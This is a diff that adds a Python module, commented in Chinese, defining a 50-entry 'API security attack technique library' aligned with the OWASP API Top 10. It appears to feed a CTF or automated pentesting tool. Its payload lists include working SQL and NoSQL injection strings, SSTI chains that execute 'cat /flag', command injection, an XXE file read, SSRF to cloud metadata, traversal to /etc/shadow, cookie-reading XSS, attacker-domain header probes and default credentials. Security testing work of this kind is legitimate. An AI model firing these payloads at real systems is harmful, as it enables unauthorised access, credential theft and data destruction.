@@ -1,0 +1,322 @@
+"""API 安全攻击技术库 (50 条) — 覆盖 OWASP API Top 10 与常见缺陷."""
+from __future__ import annotations
+
+API_SEC_TECHNIQUES: list[dict] = [
+    # ---------- 对象级授权 (BOLA/IDOR) ----------
+    {"id": "api_idor", "name": "对象引用越权 (IDOR)",
+     "description": "通过修改对象ID访问其他用户/资源数据",
+     "payloads": [
+         "遍历 /api/user/{id}, 尝试访问其他用户",
+         "修改知识库文档ID读取未授权文档",
+     ]},
+    {"id": "api_idor_uuid", "name": "UUID 枚举",
+     "description": "枚举可预测的 UUID/对象标识",
+     "payloads": [
+         "尝试递增/递减 UUID 后段访问资源",
+         "用常见默认 ID (1, admin, 0000) 遍历",
+     ]},
+    {"id": "api_mass_assignment", "name": "批量赋值",
+     "description": "在请求体中注入服务端字段覆盖权限",
+     "payloads": [
+         "提交 {id:1, role:'admin', is_admin:true}",
+         "请求体包含 balance/score/status 字段篡改",
+     ]},
+    {"id": "api_func_level_authz", "name": "功能级授权缺失 (BFLA)",
+     "description": "直接调用高权限功能接口",
+     "payloads": [
+         "未授权调用 DELETE/PUT 管理接口",
+         "低权限 token 调用 /api/admin/* 接口",
+     ]},
+    # ---------- 认证 ----------
+    {"id": "api_auth_bypass", "name": "认证绕过",
+     "description": "JWT伪造/弱密钥/未鉴权接口/默认凭据",
+     "payloads": [
+         "测试未登录即可访问的接口",
+         "JWT secret 弱密钥枚举 (secret=change-me)",
+         "管理员账号默认密码尝试",
+     ]},
+    {"id": "api_jwt_forge", "name": "JWT 伪造",
+     "description": "弱密钥签名伪造管理员 token",
+     "payloads": [
+         "用 secret='change-me' 伪造 HS256 token, role=admin",
+         "尝试 alg=none 的 JWT",
+         "把 JWT 中 username 改为 admin 后重放",
+     ]},
+    {"id": "api_jwt_replay", "name": "JWT 重放",
+     "description": "重放旧 token 绕过失效机制",
+     "payloads": [
+         "重放已过期但未销毁的 token",
+         "使用登出前的 token 继续访问",
+     ]},
+    {"id": "api_session_fixation", "name": "会话固定",
+     "description": "固定会话 ID 劫持他人会话",
+     "payloads": [
+         "设置固定 session ID 后诱导受害者使用",
+     ]},
+    {"id": "api_credential_stuffing", "name": "默认凭据爆破",
+     "description": "尝试常见默认账号密码",
+     "payloads": [
+         "admin/admin, root/root, admin/123456 等组合",
+         "尝试 swagger/guest/test 等测试账号",
+     ]},
+    # ---------- 参数/输入 ----------
+    {"id": "api_param_tamper", "name": "参数篡改",
+     "description": "隐藏参数/重复参数/类型混淆绕过校验",
+     "payloads": [
+         "添加隐藏参数 role=admin / is_admin=true",
+         "修改请求方法 GET->POST, 观察行为差异",
+         "参数类型混淆: id=1 与 id='1'",
+     ]},
+    {"id": "api_duplicate_param", "name": "重复参数混淆",
+     "description": "重复参数导致不同组件解析不同值",
+     "payloads": [
+         "id=1&id=2 观察哪边生效",
+         "参数 name=admin&name=normal 测试校验绕过",
+     ]},
+    {"id": "api_unicode_trick", "name": "Unicode 规范化绕过",
+     "description": "利用 unicode 等价字符绕过路径/参数匹配",
+     "payloads": [
+         "访问 /api/admKn (Å≈A) 绕过路由匹配",
+         "用 %2e%2e/ 编码路径穿越",
+     ]},
+    {"id": "api_null_byte", "name": "空字节注入",
+     "description": "用空字节截断校验",
+     "payloads": [
+         "文件名后追加 %00.php 绕过后缀检查",
+         "路径中插入 %00 截断",
+     ]},
+    {"id": "api_type_confusion", "name": "类型混淆",
+     "description": "数组/布尔/数字类型变换绕过校验",
+     "payloads": [
+         "id 传数组 [1,2,3] 触发批量处理",
+         "布尔字段传字符串 'false' 观察校验",
+         "JSON 数字字段传超大数溢出",
+     ]},
+    {"id": "api_sqli", "name": "SQL 注入",
+     "description": "参数化注入数据库查询",
+     "payloads": [
+         "id=1' OR '1'='1",
+         "id=1 UNION SELECT username,password FROM users",
+         "参数传 '; DROP TABLE-- 观察行为",
+     ]},
+    {"id": "api_nosqli", "name": "NoSQL 注入",
+     "description": "MongoDB 等操作符注入",
+     "payloads": [
+         "{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}",
+         "{\"$where\":\"this.password==this.username\"}",
+     ]},
+    {"id": "api_template_injection", "name": "模板注入 (SSTI)",
+     "description": "参数进入模板引擎导致代码执行/读文件",
+     "payloads": [
+         "{{7*7}} 或 ${7*7} 探测模板引擎",
+         "{{config}} 探测配置",
+         "{{self.__init__.__globals__.__builtins__.open('/flag').read()}} 读flag",
+         "{{get_flashed_messages.__globals__['__builtins__'].open('/flag').read()}}",
+         "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
+         "{{''.__class__.__mro__[1].__subclasses__()}} 探测类链",
+     ]},
+    {"id": "api_xss", "name": "XSS 存储/反射",
+     "description": "参数未过滤导致脚本注入",
+     "payloads": [
+         "<script>fetch('/api/flag')</script>",
+         "<img src=x onerror=alert(document.cookie)>",
+         "javascript:alert(1) 协议注入",
+     ]},
+    {"id": "api_command_injection", "name": "命令注入",
+     "description": "参数拼接进入系统命令",
+     "payloads": [
+         "file=1.txt; cat /flag",
+         "file=1.txt | whoami",
+         "file=`cat /flag`",
+     ]},
+    {"id": "api_ldapi", "name": "LDAP 注入",
+     "description": "LDAP 查询注入",
+     "payloads": [
+         "username=*)(uid=*))(|(uid=*",
+         "cn=admin* 通配符注入",
+     ]},
+    # ---------- 服务端请求 ----------
+    {"id": "api_ssrf", "name": "SSRF",
+     "description": "URL/文件读取类接口服务端请求伪造, 读取内网/元数据",
+     "payloads": [
+         "url=http://169.254.169.254/latest/meta-data/",
+         "file:///etc/passwd",
+         "http://127.0.0.1:port/",
+     ]},
+    {"id": "api_ssrf_dns", "name": "SSRF DNS 重绑定",
+     "description": "DNS 重绑定绕过 IP 白名单",
+     "payloads": [
+         "域名第一次解析为公网 IP 通过校验, 第二次解析为 127.0.0.1",
+     ]},
+    {"id": "api_xxe", "name": "XXE",
+     "description": "XML 外部实体注入读取文件/SSRF",
+     "payloads": [
+         "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY f SYSTEM \"file:///etc/passwd\">]><x>&f;</x>",
+         "ENTITY 指向 http://169.254.169.254/",
+     ]},
+    # ---------- 传输/头 ----------
+    {"id": "api_http_method", "name": "HTTP 方法绕过",
+     "description": "用非常规方法绕过鉴权/限流",
+     "payloads": [
+         "用 OPTIONS/HEAD/TRACE 访问受限接口",
+         "用 X-HTTP-Method-Override: GET 绕过 POST 校验",
+     ]},
+    {"id": "api_header_injection", "name": "请求头注入",
+     "description": "注入头字段伪造身份/绕过检查",
+     "payloads": [
+         "添加 X-Forwarded-For: 127.0.0.1 访问管理接口",
+         "添加 X-Real-IP / X-Originating-IP 绕过 IP 限制",
+     ]},
+    {"id": "api_cors_abuse", "name": "CORS 配置滥用",
+     "description": "宽松 CORS 跨域读取敏感响应",
+     "payloads": [
+         "测试 Origin: http://evil.com 是否回显在 Access-Control-Allow-Origin",
+     ]},
+    {"id": "api_host_header", "name": "Host 头注入",
+     "description": "篡改 Host 头影响路由/密码重置",
+     "payloads": [
+         "Host: attacker.com 观察响应中的链接",
+         "重复 Host 头/绝对 URL 注入",
+     ]},
+    {"id": "api_cookie_tamper", "name": "Cookie 篡改",
+     "description": "修改 Cookie 伪造会话/角色",
+     "payloads": [
+         "把 Cookie 中 role 字段改为 admin",
+         "修改 user_id/uid 字段越权",
+     ]},
+    # ---------- 资源/限流 ----------
+    {"id": "api_rate_bypass", "name": "限流绕过",
+     "description": "绕过频率/配额限制",
+     "payloads": [
+         "添加随机参数使缓存 key 失效",
+         "用大小写/编码变换 URL 绕过限流匹配",
+     ]},
+    {"id": "api_http2_race", "name": "HTTP/2 请求竞争",
+     "description": "利用 HTTP/2 多路复用并发绕过限制",
+     "payloads": [
+         "单连接并发多个相同请求绕过一次性校验",
+     ]},
+    {"id": "api_race_condition", "name": "条件竞争",
+     "description": "并发请求利用 TOCTOU 缺陷",
+     "payloads": [
+         "并发提交相同订单/兑换码重复获利",
+         "并发修改同一资源观察结果",
+     ]},
+    {"id": "api_resource_exhaustion", "name": "资源耗尽",
+     "description": "大载荷/深嵌套耗尽服务资源",
+     "payloads": [
+         "提交超大 JSON/XML 嵌套请求",
+         "分页参数传超大值 page_size=100000",
+     ]},
+    {"id": "api_batch_abuse", "name": "批量接口滥用",
+     "description": "利用批量接口放大攻击",
+     "payloads": [
+         "批量查询接口传大量 ID 遍历数据",
+         "GraphQL 批量别名放大查询",
+     ]},
+    # ---------- 业务/协议 ----------
+    {"id": "api_graphql_introspection", "name": "GraphQL 内省",
+     "description": "内省查询枚举全部接口与字段",
+     "payloads": [
+         "query{__schema{types{name fields{name}}}}",
+         "内省查询寻找隐藏 mutation",
+     ]},
+    {"id": "api_graphql_alias", "name": "GraphQL 别名放大",
+     "description": "别名批量请求绕过单次限制",
+     "payloads": [
+         "同字段多个别名并发查询放大数据泄露",
+     ]},
+    {"id": "api_websocket_probe", "name": "WebSocket 探测",
+     "description": "探测 WS 端点未授权访问",
+     "payloads": [
+         "连接 /ws/exec 查看是否需鉴权",
+     ]},
+    {"id": "api_file_upload", "name": "文件上传利用",
+     "description": "上传恶意文件绕过类型检查",
+     "payloads": [
+         "上传 .php.jpg / .phtml 双扩展名文件",
+         "上传含 GIF89a 头的 polyglot 文件",
+         "上传 .htaccess 覆盖规则",
+     ]},
+    {"id": "api_download_traversal", "name": "下载路径穿越",
+     "description": "下载接口路径穿越读取文件",
+     "payloads": [
+         "file=../../../../etc/passwd",
+         "filename=....//....//etc/shadow",
+     ]},
+    {"id": "api_zip_slip", "name": "ZIP 解压穿越",
+     "description": "恶意压缩包解压写入任意路径",
+     "payloads": [
+         "上传含 ../../ 路径条目的 zip 覆盖文件",
+     ]},
+    {"id": "api_jsonp", "name": "JSONP 劫持",
+     "description": "JSONP 回调窃取跨域数据",
+     "payloads": [
+         "callback=alert 或 callback=任意函数名探测",
+     ]},
+    {"id": "api_redirect", "name": "开放重定向",
+     "description": "跳转参数注入外部地址",
+     "payloads": [
+         "redirect=https://evil.com",
+         "url=//evil.com 协议相对跳转",
+     ]},
+    {"id": "api_oauth_trick", "name": "OAuth 缺陷利用",
+     "description": "OAuth 流程状态/重定向缺陷",
+     "payloads": [
+         "state 参数缺失/固定检测",
+         "redirect_uri 篡改为攻击者域名",
+     ]},
+    {"id": "api_saml_trick", "name": "SAML 缺陷利用",
+     "description": "XML 签名绕过/角色注入",
+     "payloads": [
+         "SAML 断言中注入 role=admin",
+         "去除签名或使用弱签名算法",
+     ]},
+    {"id": "api_cache_poison", "name": "缓存投毒",
+     "description": "缓存恶意响应影响其他用户",
+     "payloads": [
+         "X-Forwarded-Host 注入缓存键",
+         "缓存控制头操纵测试",
+     ]},
+    {"id": "api_debug_endpoint", "name": "调试接口探测",
+     "description": "探测调试/信息泄露接口",
+     "payloads": [
+         "访问 /debug /actuator /trace /heapdump",
+         "访问 /api/debug /api/internal /api/health/detail",
+     ]},
+    {"id": "api_actuator", "name": "Actuator 利用",
+     "description": "Spring Actuator 端点信息泄露",
+     "payloads": [
+         "访问 /actuator/env /actuator/heapdump /actuator/mappings",
+         "/actuator/gateway/routes 路由泄露",
+     ]},
+    {"id": "api_swagger_leak", "name": "接口文档泄露",
+     "description": "Swagger/OpenAPI 文档暴露接口",
+     "payloads": [
+         "访问 /swagger-ui.html /swagger/index.html",
+         "访问 /openapi.json /api-docs",
+     ]},
+    {"id": "api_version_bypass", "name": "版本绕过",
+     "description": "旧版本接口缺少新校验",
+     "payloads": [
+         "请求 /api/v1 旧版本接口",
+         "在请求中指定 API-version: 1 降级",
+     ]},
+    {"id": "api_enum_users", "name": "用户枚举",
+     "description": "注册/登录/找回密码接口用户枚举",
+     "payloads": [
+         "注册已存在用户名观察报错差异",
+         "找回密码接口响应差异枚举账号",
+     ]},
+    {"id": "api_password_stuffing", "name": "密码喷洒",
+     "description": "常见密码批量尝试",
+     "payloads": [
+         "admin123/123456/password 等常见密码组合",
+     ]},
+    {"id": "api_2fa_bypass", "name": "双因素绕过",
+     "description": "跳过或绕过 2FA 校验",
+     "payloads": [
+         "直接调用 2FA 后的接口跳过验证",
+         "验证码重放/爆破",
+     ]},
+]
